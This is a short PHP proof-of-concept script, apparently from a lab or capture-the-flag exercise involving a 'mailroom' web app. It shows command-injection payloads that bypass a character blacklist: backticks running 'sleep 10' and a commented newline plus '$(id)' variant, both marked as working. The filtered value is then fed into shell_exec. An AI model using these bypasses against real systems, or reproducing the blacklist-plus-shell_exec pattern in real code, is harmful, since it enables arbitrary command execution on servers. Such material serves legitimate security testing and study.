<?php
# Reverse Quote Injection  (work)
$bypass1 = "`sleep 10`";

# Using %0a$0d bypass regresion (work)
// $bypass2 = '123
// $(id)
// ';

$inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $bypass1);
$contents = shell_exec("dir /var/www/mailroom/inquiries/$inquiryId.html");
echo $contents
?>